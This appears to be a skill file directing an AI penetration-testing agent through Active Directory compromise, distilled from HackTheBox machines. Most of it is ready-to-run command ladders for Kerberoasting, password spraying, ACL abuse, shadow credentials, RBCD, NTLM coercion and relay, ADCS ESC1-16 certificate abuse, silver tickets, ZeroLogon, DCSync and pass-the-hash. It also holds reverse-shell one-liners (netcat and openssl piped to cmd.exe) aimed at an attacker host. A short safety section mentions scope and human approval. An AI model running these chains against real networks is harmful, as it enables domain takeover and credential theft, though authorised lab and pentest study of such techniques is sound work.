---
name: Active Directory Attacks
description: Enumerate and attack Active Directory — map the shortest path to Domain Admin via Kerberos, ADCS, ACLs, coercion/relay, delegation, and credential dumping, then prove impact.
tags: [windows, ad, kerberos, adcs, acl-abuse, rbcd, delegation, dcsync, shadow-credentials, coercion, relay, lateral-movement, privilege-escalation]
recommended_tools: [execute_command, netexec_scan, enum4linux_scan, smbmap_scan, nmap_scan, hydra_attack]
vuln_classes: [active_directory]
domain: active-directory
phase: exploitation
---
# Active Directory Attacks

Goal: map the **shortest path to Domain Admin** (or the engagement objective). After each
step, READ the output, REASON about the exposed attack surface, and pick the highest-impact
next action. Propagate discovered credentials (use a known NT hash instead of a password when
you have one). Tooling backbone: `impacket`, `netexec`/`crackmapexec`, `certipy` (ADCS),
`bloodyAD`/`Rubeus`/`mimikatz` (Kerberos/creds/ACLs), `bloodhound`/`rusthound-ce` (paths) — run via
`execute_command`.

## 1. Enumerate (unauth → low-priv)
- Hosts/services: `nmap -p88,135,139,389,445,464,636,3268,5985` to find DCs (88/389/445).
- Null/guest + low-priv: `netexec smb <dc> -u '' -p ''`, `enum4linux-ng`, `smbmap`.
- Users: RID-cycling, `netexec ... --users`; LDAP dumps; spider shares for creds/configs.
- **BloodHound** collection (`bloodhound-python -c All`) → analyze for shortest DA paths,
  Kerberoastable users, ACL edges, unconstrained/constrained/RBCD delegation, ADCS templates.

## 2. Credentials without a shell
- **AS-REP roast** users with `DONT_REQ_PREAUTH` (`GetNPUsers.py`) → crack offline.
- **Kerberoast** SPN accounts (`GetUserSPNs.py`) → crack TGS offline.
- **Password spray** (low-and-slow, respect lockout): `netexec smb <dc> -u users.txt -p 'Season2025!'`.
- **Coercion → relay**: PetitPotam / PrinterBug / DFSCoerce to coerce a machine to auth, relay
  NTLM to LDAP (RBCD) or to **ADCS web enrollment (ESC8)** with `ntlmrelayx` → machine/cert.

## 3. Escalate (the high-value chains)
- **ADCS (certipy)**: ESC1 (arbitrary SAN → any user incl. DA), ESC4 (template ACL overwrite),
  ESC6 (CA EDITF flag), ESC8 (relay to web enrollment), ESC9/ESC11. A cert → PKINIT → TGT/NT hash.
- **ACL abuse**: GenericAll/WriteDACL → add to group, force password, or **Shadow Credentials**
  (`msDS-KeyCredentialLink`, `certipy shadow auto` / `pywhisker`) → PKINIT.
- **RBCD**: with `MachineAccountQuota>0` or write on a computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity`,
  then `getST.py -impersonate Administrator` → service access. **Bronze Bit (CVE-2020-17049)** if patched-around.
- **Delegation**: unconstrained (capture TGTs via coercion), constrained (`S4U2Proxy`).
- **GPO abuse**: write on a GPO/OU-link → scheduled task / restricted-groups local admin; **GPP cPassword**.

## 4. Domain compromise & proof
- **DCSync** (`secretsdump.py <user>@<dc> -just-dc`) once you hold replication rights or DA →
  dump krbtgt + target NT hashes. **Proof of DA** = a DCSync of `krbtgt`/`administrator`, or
  authenticated access to the DC (`netexec smb <dc> -u administrator -H <hash>` showing `Pwn3d!`).
- Lateral movement: Pass-the-Hash / Pass-the-Ticket via `wmiexec`/`psexec`/`evil-winrm`.

## Evidence to capture
The exact technique, the command, and the concrete proof (cracked hash, issued cert, `Pwn3d!`,
DCSync output, an impersonated TGT). Don't claim "pwned" without it.

## Safety
Credential dumping, ticket forgery, DCSync, coercion, and relay are destructive/state-changing —
HITL-gated. Stay in scope; avoid krbtgt golden-ticket persistence unless explicitly authorized.
CWE-287 / CWE-269.

---

## Real-world chains (0xdf HTB)

Battle-tested command ladders distilled from ~50 HTB machines. Placeholders generalized:
`<DC>`/`<IP>` (DC), `<DOMAIN>`, `<USER>`/`<PASS>`/`<HASH>` (NT hash), `<TARGET>` (host),
`<TARGET_USER>`/`<VICTIM>`, `<CA>`/`<TEMPLATE>`, `<SID>`. When NTLM is disabled or you're
Kerberos-only: `ntpdate <DC>` first, add `-k`/`--use-kcache`, set `KRB5CCNAME=<...>.ccache`.
Feed every low-priv cred straight into BloodHound before choosing an escalation.

### Unauth / null enumeration → user list
Most chains start here. Build a user list, then spray or roast it. (freq: nearly every box)
```
netexec smb <DC> -u '' -p ''                             # domain, host, signing
netexec ldap <DC> -u '' -p '' --query "(sAMAccountName=*)" ""   # anon bind; read description fields
netexec smb <DC> -u guest -p '' --rid-brute 20000 | grep SidTypeUser
lookupsid.py -no-pass guest@<DOMAIN> 20000               # or <DOMAIN>/<USER>:'<PASS>'@<DC>
kerbrute userenum -d <DOMAIN> --dc <DC> /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
```
PROOF: SAMAccountNames printed as `SidTypeUser`; kerbrute `[+] VALID USERNAME`. Watch AD
`description` attributes — they routinely leak `Set initial password to ...` (Baby, Cicada).

### Credential-guessing plays (spray / username-as-pass / blank)
```
kerbrute passwordspray -d <DOMAIN> --dc <DC> users.txt '<PASS>'          # seasonal / leaked default
netexec smb <DC> -u users.txt -p seasons.txt --continue-on-success
netexec smb <DC> -u users.txt -p users.txt --no-bruteforce              # username == password
netexec smb <DC> -u users.txt -p '' --continue-on-success               # blank / must-change accts
netexec smb <DC> -u <USER> -p '' -M change-password -o NEWPASS=<PASS>    # set pw on must-change acct
```
PROOF: `[+] <DOMAIN>\<USER>:<PASS>` line. Reuse hits are common (Flight, Cicada, Sendai).

### AS-REP roast (accounts with DONT_REQUIRE_PREAUTH)
```
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <IP> -format hashcat
GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -dc-ip <IP>               # authed: find all
netexec ldap <DC> -u <USER> -p <PASS> --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```
PROOF: `$krb5asrep$23$...` captured; cracked → cleartext (Infiltrator, Jab, Rebound).
Bonus: an AS-REP-roastable user enables **unauth Kerberoast** — `GetUserSPNs.py -no-preauth <asrep_user> -usersfile users <DOMAIN>/ -dc-host <IP>` (Rebound).

### Kerberoast (SPN accounts) + targeted variants
```
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request -outputfile krb.txt
netexec ldap <DC> -u <USER> -p <PASS> [-k] --kerberoasting krb.txt
hashcat -m 13100 krb.txt rockyou.txt
```
**Targeted Kerberoast** — you hold WriteSPN/GenericWrite over a user (set SPN, roast, crack):
```
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASS>                # auto add/roast/remove SPN
# or manual: bloodyAD ... set object <TARGET_USER> servicePrincipalName -v 'http/whatever'
#            netexec ldap <DC> -u <USER> -p <PASS> -k --kerberoasting <TARGET_USER>
```
PROOF: `$krb5tgs$23$*svc$...` cracked → service-account password (Administrator, Voleur, TombWatcher, Axlle).

### BloodHound collection & path analysis (freq: nearly every box)
```
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <IP> -c all --zip
rusthound-ce -d <DOMAIN> -u <USER> -p '<PASS>' -c All --zip              # fast; Kerberos-friendly
netexec ldap <DC> -u <USER> -p <PASS> [-k] --bloodhound -c All --dns-server <IP>
netexec smb <DC> -u <USER> -p <PASS> --users --rid-brute               # + discover forest trusts
```
PROOF: shortest-path edge to DA (ACL, delegation, session) identified; cross-forest trust flagged (DarkZero).

### ACL abuse (map the BloodHound edge → primitive)
The core escalation engine. Chain edges freely (AddSelf→group→ForceChangePassword is the classic).
```
# ForceChangePassword — reset a user you control
net rpc password <TARGET_USER> 'Newp@ss1' -U <DOMAIN>/<USER>%<PASS> -S <DC>
netexec smb <DC> -u <USER> -H <HASH> -M change-password -o USER=<TARGET_USER> NEWPASS=<PASS>
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set password <TARGET_USER> 'Newp@ss1'

# AddSelf / GenericAll on a group — add yourself (then use the group's rights)
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add groupMember '<GROUP>' <USER>
net rpc group addmem '<GROUP>' <USER> -U <DOMAIN>/<USER>%<PASS> -S <DC>

# WriteOwner — take ownership, grant self control, then pick a primitive above
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set owner <TARGET> <USER>
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add genericAll <TARGET> <USER>
owneredit.py -action write -new-owner <USER> -target '<GROUP>' <DOMAIN>/<USER>:<PASS>

# WriteDACL — grant FullControl (or DCSync) via DACL
dacledit.py -action write -rights FullControl -principal <USER> -target-dn '<TARGET_DN>' <DOMAIN>/<USER>:<PASS>
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add dcsync <USER>      # → jump to DCSync

# Re-enable / unblock a controlled-but-disabled account
bloodyAD -d <DOMAIN> --host <DC> -u <USER> -p <PASS> remove uac <TARGET_USER> -f ACCOUNTDISABLE
bloodyAD ... set object <TARGET_USER> logonHours -v '////////////////////////////' --b64
```
PROOF: password reset accepted; membership confirmed via `netexec ... --groups`; new ACE readable
(NanoCorp, RustyKey, Puppy, Certified, Administrator, Mirage, Reel, Object). GPO/OU-scoped GenericAll can also
**restore a deleted privileged account** from the AD Recycle Bin: `Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects` → `Restore-ADObject` → reset its password (Voleur, TombWatcher).
Older on-host / PowerView equivalents of these primitives (same edges, native tooling):
```
# WriteOwner → take ownership, grant self ResetPassword, force-reset the victim
. .\PowerView.ps1
Set-DomainObjectOwner -Identity <TARGET_USER> -OwnerIdentity <USER>
Add-DomainObjectAcl -TargetIdentity <TARGET_USER> -PrincipalIdentity <USER> -Rights ResetPassword
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<PASS>' -AsPlainText -Force)
# WriteDACL / WriteOwner on a *privileged group* → add self, then read its rights (LAPS/DA)
Set-DomainObjectOwner -Identity '<GROUP>' -OwnerIdentity <USER>
Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity <USER> -Rights All
Add-DomainGroupMember -Identity '<GROUP>' -Members <USER>          # or: net group <GROUP> <USER> /add
# GenericWrite → set logon scriptPath so payload runs at the victim's next logon
Set-DomainObject -Identity <TARGET_USER> -SET @{scriptpath='C:\path\script.ps1'}
# GenericWrite → flip UAC to DONT_REQ_PREAUTH, then AS-REP roast the target
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304}
```
PROOF: PowerView reset/ownership succeeds; scriptPath payload runs as victim at logon; flipped
account becomes AS-REP roastable → crack (Reel, Object, MultiMaster).
**Account Operators** membership is a hidden escalation: create a user, add it to a WinRM/LAPS-read
group, then read the LAPS admin password:
```
New-ADUser <USER> -credential $cred -enabled $true -accountpassword $pass
# add <USER> to Remote Management Users and the LAPS-reader group, then:
Get-ADComputer <TARGET> -property 'ms-mcs-admpwd'
```
PROOF: LAPS local-admin plaintext read → admin shell (PivotAPI).

### Shadow Credentials (GenericWrite/GenericAll on target's key attr)
Overwrite `msDS-KeyCredentialLink` → PKINIT as the target. Quieter than a password reset.
```
certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET> -dc-ip <DC>
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p <PASS> add shadowCredentials <TARGET>
# Whisker/Rubeus on-host: Whisker.exe add /target:<TARGET> ... ; Rubeus.exe asktgt /certificate:<B64> /getcredentials
certipy auth -pfx <TARGET>.pfx -dc-ip <DC>
```
PROOF: `Got hash for '<TARGET>': aad3b...:<NThash>` + TGT written (TombWatcher, Haze, Rebound,
Outdated, EscapeTwo, Absolute).

### gMSA / delegated MSA password read
Membership (often via AddSelf/GenericAll) in a group listed in `PrincipalsAllowedToRetrieveManagedPassword`.
```
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add groupMember <GMSA_GROUP> <USER>
netexec ldap <DC> -u <USER> -p <PASS> --gmsa
# BadSuccessor (Server 2025, CVE-2025-53779): create dMSA linked to Administrator to inherit its TGT
netexec ldap <DC_FQDN> -u <USER> -p '<PASS>' -M badsuccessor -o TARGET_OU='OU=Staff,...' DMSA_NAME=x TARGET_ACCOUNT=Administrator
```
PROOF: gMSA NT hash recovered (TombWatcher, Sendai, Haze, Ghost); dMSA TGT contains RID 512/519 (Eighteen).

### LAPS local-admin password read
Membership in a LAPS-reader group (often reached via WriteOwner→group→AddSelf) lets you read the
per-machine `ms-Mcs-AdmPwd` cleartext local admin password.
```
netexec ldap <DC> -u <USER> -p <PASS> --module laps
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd
Get-ADComputer <TARGET> -property 'ms-mcs-admpwd'                 # on-host / ActiveDirectory module
evil-winrm -i <DC> -u administrator -p '<LAPS_PASS>'
```
PROOF: cleartext local admin password returned → admin shell (Timelapse, StreamIO, PivotAPI).

### RBCD (resource-based constrained delegation)
Write on target's `msDS-AllowedToActOnBehalfOfOtherIdentity` + a controlled account with an SPN.
```
addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip <DC> <DOMAIN>/<USER>:<PASS>
rbcd.py -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write -dc-ip <DC> <DOMAIN>/<USER>:<PASS>
getST.py -spn cifs/<TARGET> -impersonate Administrator -dc-ip <DC> <DOMAIN>/'FAKE$':'P@ss123'
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass <TARGET>
```
Impersonate a DA who has the `NOT_DELEGATED` flag? Use **U2U + S4U** (set your hash to the TGT
session key first): `getST.py -u2u -impersonate Administrator -spn cifs/<DC> <DOMAIN>/<acct> -k -no-pass`
→ DCSync (Phantom, RustyKey, Vintage, Freelancer, Support).
PROOF: `getST.py` writes `Administrator.ccache`; PtT → shell / DCSync.

### Constrained / unconstrained delegation & SeEnableDelegationPrivilege
```
# Constrained (S4U2Proxy) once msDS-AllowedToDelegateTo is set:
getST.py '<DOMAIN>/<COMPUTER>$:<PASS>' -spn ldap/<DC_FQDN> -impersonate Administrator
# SeEnableDelegationPrivilege: create computer, add DNS+SPN, flag TRUSTED_FOR_DELEGATION,
# coerce DC (PrinterBug) and capture DC$ TGT with krbrelayx
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add uac '<PC>$' -f TRUSTED_FOR_DELEGATION
krbrelayx.py -hashes :<HASH>
netexec smb <DC> -u '<PC>$' -p <PASS> -M coerce_plus -o LISTENER=<PC>.<DOMAIN> METHOD=PrinterBug
```
PROOF: S4U ticket for impersonated admin / captured DC$ TGT ccache (Delegate, Redelegate, Rebound).

### Coercion → NTLM/Kerberos relay
Coerce a machine (esp. DC$) to authenticate, then relay. Add an attacker **DNS record** first when
you need a resolvable listener (needs DNS write, `dnstool.py`/`bloodyAD add dnsRecord`).
```
netexec smb <TARGET> -u <USER> -p <PASS> [-k] -M coerce_plus -o LISTENER=<REC> METHOD=PetitPotam
# Relay targets:
ntlmrelayx.py -t ldaps://<DC> -i --remove-mic-partial -smb2support     # LDAP → RBCD / shadow creds
ntlmrelayx.py -t winrms://<TARGET> -smb2support                        # WinRM → SYSTEM shell
ntlmrelayx.py -6 -t ldap://<DC> --delegate-access --escalate-user 'FAKE$'   # mitm6 IPv6/WPAD
```
PetitPotam+relay→ldaps can plant Shadow Creds on a machine account; `certipy auth -pfx ms01.pfx`
then dumps its hash. CVE-2025-33073 (local NTLM reflection via CMTI DNS record) yields a DC$ LDAP
shell (Signed, Mist, University, DarkZero, DarkCorp).
**AD DNS record injection** (authenticated users can add DNS) also coerces a *scheduled* task:
if a periodic script fetches a `web-*` / wildcard host, add an A record pointing at you to catch its
inbound auth or serve a payload:
```
python3 dnstool.py -u '<DOMAIN>\<USER>' -p <PASS> --action add --record web-0xdf --data <IP> --type A <DOMAIN>
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add dnsRecord <REC> <IP>
```
PROOF: `ntlmrelayx` catches `DC01$` and completes the relay; interactive shell / cert issued;
inbound HTTP/auth from the DC arrives at your listener (Intelligence).

### ADCS ESC1–ESC16 (certipy)
```
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -vulnerable -stdout
```
**ESC1** (enrollee-supplied SAN) — request as any principal:
```
certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -sid <ADMIN_SID>
certipy auth -pfx administrator.pfx -dc-ip <DC>
```
**ESC3** (enrollment agent) — enroll on-behalf-of a higher-priv user:
```
certipy req -u <USER> -p <PASS> -ca <CA> -template <CRA_TEMPLATE>
certipy req -u <USER> -p <PASS> -ca <CA> -template <USER_TEMPLATE> -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'
```
**ESC4** (writable template) — rewrite to ESC1, request, restore:
```
certipy template -u <USER> -p <PASS> -template <TEMPLATE> -write-default-configuration   # -save-old
```
Others follow the same **find→req→auth** ladder: **ESC8** (relay to web enrollment: `certipy relay -target http://<CA>/certsrv/certfnsh.asp -template DomainController` + coerce), **ESC9** (no-security-ext: spoof victim UPN on controlled acct, enroll, revert UPN), **ESC10** (weak Schannel UPN mapping → `certipy account update -upn 'DC01$@<DOMAIN>'`), **ESC14** (writable `altSecurityIdentities`), **ESC15** (v1 template → chain into ESC3), **ESC16** (Security Ext disabled CA-wide).
**WriteProperty on a template** (ESC4 by hand): add a Client-Auth / **Smart Card Logon** EKU, then
enroll as Administrator via a SAN and PKINIT-auth. Handle a not-yet-valid cert with `faketime`:
```
Set-ADObject "CN=<TEMPLATE>,..." -Add @{pKIExtendedKeyUsage='1.3.6.1.4.1.311.20.2.2'}   # smartcard logon EKU
openssl req -config admin.cnf -subj '<DN>' -new -nodes -sha256 -out admin.req -keyout admin.key
certreq -submit -config '<HOST>\<CA>' -attrib 'CertificateTemplate:<TEMPLATE>' admin.req admin.cer
faketime -f +1h kinit -X X509_user_identity=FILE:admin.cer,admin.key administrator@<DOMAIN>
# alt: Rubeus.exe asktgt /user:Administrator /certificate:<PFX> /getcredentials  → recover NTLM → PtH
```
PROOF: signed cert for Administrator; `klist` shows a krbtgt TGT / recovered NT hash → admin shell (Anubis).
**Golden Cert** (CA key stolen): `certipy forge -ca-pfx ca.pfx -upn Administrator@<DOMAIN>`.
**PtC**: `certipy cert -pfx admin.pfx -nocert` → `passthecert.py -action ldap-shell -crt admin.crt -key admin.key`.
PROOF: `certipy req` yields `administrator.pfx`; `certipy auth` prints NT hash + TGT
(Retro, Shibuya, Manager, Coder, Authority, Escape, Certified, Sendai, EscapeTwo, Fluffy, TombWatcher, Mirage, VulnCicada, University-forge, Scepter).

### MSSQL ticket forgery (silver ticket)
Have a service account NT hash + domain SID + MSSQL SPN → forge a ticket as any user, optionally
injecting a privileged group RID for sysadmin.
```
python3 -c 'import hashlib;print(hashlib.new("md4","<PASS>".encode("utf-16le")).hexdigest())'   # pw→NT hash
ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -spn MSSQLSvc/<TARGET>:1433 [-groups <RID>] Administrator
KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k <TARGET>     # then enable_xp_cmdshell
```
PROOF: `mssqlclient` shows `dbo@master` (sysadmin); `xp_cmdshell` → shell (Breach, Signed, Sendai, Escape).

### Pre-2000 / machine-account defaults & ZeroLogon
```
netexec smb <DC> -u '<COMP>$' -p <comp_lower> -k          # pre-2000 acct: pw = lowercase hostname
changepasswd.py -newpass <NEWPASS> '<DOMAIN>/BANKING$:banking@<DC>' -protocol rpc-samr
cve-2020-1472-exploit.py <DC_NETBIOS> <TARGET>            # ZeroLogon: blank DC$ pw → DCSync (CVE-2020-1472)
```
PROOF: pre-2000 auth succeeds / TGT generated (RetroTwo, Retro, Haze); ZeroLogon → DCSync (RetroTwo).

### DCSync (replication rights or DA)
```
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC> -just-dc
secretsdump.py <DOMAIN>/<USER>@<DC> -hashes :<HASH> -just-dc-user krbtgt
netexec smb <DC> --use-kcache --ntds --user Administrator          # Kerberos-only
```
PROOF: `krbtgt:502:aad3b...:<hash>` and `Administrator` NT hash dumped (Mirage, Scepter, Administrator, Vintage, Phantom).

### GPO abuse
Edit rights over a linked GPO → push a scheduled task / local-admin add.
```
pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GUID> -command 'net localgroup administrators <USER> /add' -f
# on-host: SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "..." ; gpupdate /force
```
PROOF: scheduled task adds you to local Administrators → DA-equivalent (BabyTwo, Office, Jab).

### Pass-the-Hash / Pass-the-Ticket (lateral & proof)
```
netexec smb <TARGET> -u administrator -H <HASH>          # look for (Pwn3d!)
evil-winrm -i <TARGET> -u administrator -H <HASH>        # or evil-winrm-py
psexec.py -hashes :<HASH> administrator@<TARGET>
wmiexec.py <DOMAIN>/administrator@<TARGET> -k -hashes :<HASH>       # Kerberos PtH
dcomexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET> '<CMD>' -silentcommand -object MMC20   # DCOM RCE
export KRB5CCNAME=<user>.ccache; wmiexec.py -k -no-pass <TARGET>   # PtT
```
PROOF: `netexec` shows `(Pwn3d!)`; SYSTEM/Administrator shell on the DC.
```
# Kerberos-only shops (NTLM disabled): generate krb5.conf, kinit, then SSH/WinRM with GSSAPI
netexec smb <TARGET> -u <USER> -p '<PASS>' -k --generate-krb5-file krb5.conf && sudo cp krb5.conf /etc/krb5.conf
kinit <USER> && ssh -k <USER>@<TARGET>
```

### MS14-068 PAC forgery (unpatched DC)
On a legacy DC a low-priv user can forge a Kerberos ticket with a privileged PAC → instant DA.
```
rpcclient -U <USER> <IP> -c 'lookupnames <USER>'          # grab the user SID
ntpdate <IP> && kinit <USER>
python ms14-068.py -u <USER>@<DOMAIN> -s <SID> -d <DC_FQDN>
cp TGT_<USER>@<DOMAIN>.ccache /tmp/krb5cc_0
goldenPac.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```
PROOF: `nt authority\system` shell; root.txt (CVE MS14-068 — Mantis).

### RPC / null-session info leaks (users, printers, secrets)
Null or authenticated RPC often leaks the user list and secrets stashed in object comments.
```
rpcclient -U '' -N <IP> -c 'enumdomusers'                 # null-session user enum
rpcclient -U '<USER>%<PASS>' <IP> -c 'querydispinfo; enumprinters'   # printer/comment secrets
rpcclient -U '<USER>%<PASS>' <IP> -c 'setuserinfo2 <TARGET_USER> 23 <NEWPASS>'   # ForceChangePassword via RPC
```
PROOF: user list dumped; a printer comment / description leaks a service password; RPC password
reset accepted (Forest, Fuse, Blackfield).

### MSSQL RID-brute domain user enum via SQLi
When MSSQL runs as a domain account, `SUSER_SNAME`/`SUSER_SID` resolve RIDs → domain usernames
even through a blind SQL injection.
```
-- take the base domain SID from SUSER_SID(<known_principal>), then loop RIDs 500-10500:
SELECT SUSER_SNAME(<base_sid_bytes + RID>)
```
PROOF: valid domain usernames resolved for follow-on roasting (MultiMaster).

### LNK / credential-script poisoning (user-context pivot)
Write access to a startup shortcut or a script another user runs → execute as that user.
```
# poison a .lnk on a shared/public desktop: repoint its target at a reverse shell
cmd /c openssl s_client -quiet -connect <IP>:73 | cmd.exe | openssl s_client -quiet -connect <IP>:136
# or trojanize a credential-building script (e.g. wm.ps1) the victim executes:
nc64.exe -e cmd.exe <IP> 443
```
Constrained JEA/PSSession configs can also be leveraged for cross-host exec with captured creds:
```
$cred = New-Object PSCredential('<DOMAIN>\<USER>',(ConvertTo-SecureString '<PASS>' -AsPlainText -Force))
Invoke-Command -ComputerName <HOST> -ConfigurationName <JEA_CONFIG> -Credential $cred -ScriptBlock { whoami }
```
PROOF: reverse shell as the victim who opened the LNK / ran the script; JEA command runs as the
delegated identity (Ethereal, Acute).

### Pivoting to unreachable Windows hosts (tunnel + WinRM)
Internal DCs/hosts reachable only through a foothold — tunnel WinRM/SMB over SOCKS or a port-forward.
```
# chisel reverse port-forward to an internal WinRM, then evil-winrm through it
./chisel client <IP>:8000 R:9001:<DC_IP>:5985
evil-winrm -i 127.0.0.1 -P 9001 -u <USER> -p '<PASS>'
proxychains evil-winrm -i <TARGET> -u <USER> -p '<PASS>'          # or via a SOCKS proxy
Invoke-Command -ComputerName <HOST> -Credential $cred -ScriptBlock { whoami }   # native double-hop
```
PROOF: shell on a host with no direct route from the attacker (Fulcrum, Search).

### Kerberos-based spray / hash-spray (bypass SMB rate limiting)
When SMB spraying trips lockout/wail2ban, Kerberos pre-auth is often unthrottled — spray passwords
or even NTLM hashes over Kerberos.
```
kerbrute passwordspray -d <DOMAIN> --dc <DC> users.txt '<PASS>'
python2 kerbBruteHash.py <DOMAIN> <DC_FQDN> <USER> hashes-ntlm.txt        # NTLM-hash spray variant
```
PROOF: a valid password / NT hash found without tripping the SMB lockout (APT).
